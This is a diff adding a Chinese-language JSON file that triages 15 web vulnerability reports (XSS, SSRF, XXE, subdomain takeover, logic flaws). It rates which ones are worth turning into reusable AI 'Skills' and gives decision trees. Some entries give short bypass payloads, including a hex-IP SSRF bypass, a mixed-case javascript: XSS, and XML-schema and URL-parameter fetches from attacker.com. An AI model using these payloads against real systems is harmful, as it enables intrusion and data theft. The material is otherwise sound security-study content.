@@ -1,0 +1,295 @@
+{
+ "summary": {
+  "total": 15,
+  "worth_skill": 5,
+  "not_worth": 10,
+  "top_ids": [
+   530853,
+   128685,
+   200693,
+   1150799,
+   1595006
+  ]
+ },
+ "detailed_evaluations": [
+  {
+   "id": 530853,
+   "knowledge_point": "富文本编辑器嵌套 embed 对象解析缺陷导致存储型 XSS",
+   "is_ai_likely_known": false,
+   "reason": "针对特定富文本编辑器内部结构，训练数据少，需深入理解解析逻辑。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到其他富文本编辑器、JSON 嵌套解析场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'富文本编辑器嵌套对象解析绕过'原理-机制-锚点-迁移路径。",
+   "skill_framework": {
+    "name": "富文本编辑器嵌套对象解析绕过",
+    "适用场景": [
+     "富文本编辑器 XSS 防护",
+     "JSON 嵌套结构输入过滤"
+    ],
+    "核心原理": [
+     "编辑器对嵌套对象（如 embed-external）的 URL 字段未深度转义",
+     "攻击者利用嵌套结构绕过扁平化过滤"
+    ],
+    "决策树": [
+     "IF 存在富文本编辑器 AND 支持嵌套对象 → 测试 URL 字段注入 iframe"
+    ],
+    "示例": [
+     "构造 embed-external 对象，URL 字段含 iframe 标签"
+    ],
+    "迁移场景": [
+     "XSS 防护",
+     "输入验证"
+    ]
+   }
+  },
+  {
+   "id": 192082,
+   "knowledge_point": "客户端控制安全问题选择参数导致认证绕过",
+   "is_ai_likely_known": true,
+   "reason": "常见逻辑缺陷，AI 已知。",
+   "scene_frequency": "中频",
+   "migration_potential": "低（仅适用于安全问题流程）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "通用 Prompt 直接提问即可。",
+   "skill_framework": null
+  },
+  {
+   "id": 1024880,
+   "knowledge_point": "过期子域名未配置安全头导致认证绕过",
+   "is_ai_likely_known": true,
+   "reason": "子域名接管和配置错误是常见知识。",
+   "scene_frequency": "中频",
+   "migration_potential": "低（依赖具体子域名配置）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "Prompt 引导即可，不单独固化。",
+   "skill_framework": null
+  },
+  {
+   "id": 58831,
+   "knowledge_point": "Flash ExternalInterface 参数注入 XSS",
+   "is_ai_likely_known": true,
+   "reason": "Flash XSS 是已知领域，但已过时。",
+   "scene_frequency": "低频",
+   "migration_potential": "低（Flash 已淘汰）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "Prompt 引导即可，不单独固化。",
+   "skill_framework": null
+  },
+  {
+   "id": 121696,
+   "knowledge_point": "2FA 验证码无尝试次数限制导致暴力破解",
+   "is_ai_likely_known": true,
+   "reason": "常见认证缺陷，AI 已知。",
+   "scene_frequency": "高频",
+   "migration_potential": "低（仅适用于 2FA 流程）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "通用 Prompt 直接提问即可。",
+   "skill_framework": null
+  },
+  {
+   "id": 128685,
+   "knowledge_point": "十六进制 IP 表示法绕过 SSRF 过滤",
+   "is_ai_likely_known": false,
+   "reason": "IP 表示法变体绕过是具体技术，AI 可能不全面。",
+   "scene_frequency": "高频",
+   "migration_potential": "高（可迁移到 SSRF、WAF 绕过）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'IP 表示法变体绕过'原理-机制-锚点-迁移路径。",
+   "skill_framework": {
+    "name": "IP 表示法变体绕过",
+    "适用场景": [
+     "SSRF 防护",
+     "WAF IP 过滤"
+    ],
+    "核心原理": [
+     "IP 地址有多种表示法（十六进制、八进制、整数等）",
+     "过滤层与请求层解析不一致"
+    ],
+    "决策树": [
+     "IF 存在 IP 黑名单 AND 过滤基于点分十进制 → 尝试十六进制、八进制、整数表示"
+    ],
+    "示例": [
+     "http://0x7f.1/ → 127.0.0.1"
+    ],
+    "迁移场景": [
+     "SSRF",
+     "WAF 绕过"
+    ]
+   }
+  },
+  {
+   "id": 200693,
+   "knowledge_point": "RDoc 标记语言协议头大小写绕过 XSS",
+   "is_ai_likely_known": false,
+   "reason": "针对特定标记语言解析器，训练数据少。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到其他标记语言如 Markdown、reStructuredText）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'标记语言协议头绕过'原理-机制-锚点-迁移路径。",
+   "skill_framework": {
+    "name": "标记语言协议头绕过",
+    "适用场景": [
+     "Markdown、RDoc 等标记语言 XSS 防护"
+    ],
+    "核心原理": [
+     "解析器对协议头大小写不敏感，但过滤层敏感",
+     "利用大小写混合绕过白名单"
+    ],
+    "决策树": [
+     "IF 存在标记语言渲染 AND 协议白名单 → 尝试大小写混合"
+    ],
+    "示例": [
+     "XSS[JaVaScRiPt:alert(1)]"
+    ],
+    "迁移场景": [
+     "XSS 防护",
+     "输入过滤"
+    ]
+   }
+  },
+  {
+   "id": 1150799,
+   "knowledge_point": "XML Schema schemaLocation 触发外部实体加载",
+   "is_ai_likely_known": false,
+   "reason": "XXE 的变体，利用 schemaLocation 而非实体引用，AI 可能不熟悉。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到 XXE 防护、XML 解析安全）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'XML 外部实体加载变体'原理-机制-锚点-迁移路径。",
+   "skill_framework": {
+    "name": "XML 外部实体加载变体",
+    "适用场景": [
+     "XXE 防护",
+     "XML 解析安全"
+    ],
+    "核心原理": [
+     "XML Schema 的 schemaLocation 可加载外部资源",
+     "绕过传统实体引用过滤"
+    ],
+    "决策树": [
+     "IF 存在 XML 解析 AND 未禁用外部实体 → 测试 schemaLocation"
+    ],
+    "示例": [
+     "<xs:schema xmlns:xs='http://www.w3.org/2001/XMLSchema'><xs:import namespace='x' schemaLocation='http://attacker.com/xsd'/></xs:schema>"
+    ],
+    "迁移场景": [
+     "XXE",
+     "SSRF"
+    ]
+   }
+  },
+  {
+   "id": 121461,
+   "knowledge_point": "S3 子域名接管",
+   "is_ai_likely_known": true,
+   "reason": "经典子域名接管，AI 已知。",
+   "scene_frequency": "高频",
+   "migration_potential": "低（依赖 DNS 配置）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "通用 Prompt 直接提问即可。",
+   "skill_framework": null
+  },
+  {
+   "id": 771694,
+   "knowledge_point": "负数量绕过价格计算",
+   "is_ai_likely_known": true,
+   "reason": "常见业务逻辑漏洞，AI 已知。",
+   "scene_frequency": "中频",
+   "migration_potential": "低（仅适用于电商场景）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "通用 Prompt 直接提问即可。",
+   "skill_framework": null
+  },
+  {
+   "id": 1595006,
+   "knowledge_point": "第三方模块测试接口导致未认证 SSRF 和 RFI",
+   "is_ai_likely_known": false,
+   "reason": "供应链组件风险，具体模块的测试接口，AI 可能不熟悉。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到供应链安全、第三方组件审计）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化'第三方组件测试接口滥用'原理-机制-锚点-迁移路径。",
+   "skill_framework": {
+    "name": "第三方组件测试接口滥用",
+    "适用场景": [
+     "供应链安全",
+     "第三方组件审计"
+    ],
+    "核心原理": [
+     "第三方模块自带测试接口，未认证即可访问",
+     "接口可能允许 SSRF 或文件下载，导致进一步攻击"
+    ],
+    "决策树": [
+     "IF 使用第三方模块 AND 存在测试接口 → 检查是否未认证且可发起请求"
+    ],
+    "示例": [
+     "访问 css_optimiser.php?url=http://attacker.com/malicious.css"
+    ],
+    "迁移场景": [
+     "SSRF",
+     "LFI/RFI"
+    ]
+   }
+  },
+  {
+   "id": 2065306,
+   "knowledge_point": "ODBC 驱动参数加载任意 DLL 导致命令执行",
+   "is_ai_likely_known": false,
+   "reason": "特定配置项滥用，AI 可能不熟悉。",
+   "scene_frequency": "低频",
+   "migration_potential": "中（可迁移到其他驱动加载场景）",
+   "source_quality": "高",
+   "worth_skill": false,
+   "suggested_handling": "Prompt 引导即可，不单独固化。",
+   "skill_framework": null
+  },
+  {
+   "id": 1460373,
+   "knowledge_point": "竞态条件绕过邀请数量限制",
+   "is_ai_likely_known": true,
+   "reason": "TOCTOU 竞争条件是常见知识。",
+   "scene_frequency": "高频",
+   "migration_potential": "低（依赖具体业务逻辑）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "通用 Prompt 直接提问即可。",
+   "skill_framework": null
+  },
+  {
+   "id": 629892,
+   "knowledge_point": "CORS 配置过宽导致 CSRF",
+   "is_ai_likely_known": true,
+   "reason": "CORS 配置错误是常见知识。",
+   "scene_frequency": "中频",
+   "migration_potential": "低（依赖具体 CORS 配置）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "Prompt 引导即可，不单独固化。",
+   "skill_framework": null
+  },
+  {
+   "id": 1853061,
+   "knowledge_point": "Rendertron XSS 过滤绕过",
+   "is_ai_likely_known": true,
+   "reason": "已知组件的配置问题，AI 可能知道。",
+   "scene_frequency": "中频",
+   "migration_potential": "低（依赖特定组件）",
+   "source_quality": "通用",
+   "worth_skill": false,
+   "suggested_handling": "Prompt 引导即可，不单独固化。",
+   "skill_framework": null
+  }
+ ]
+}
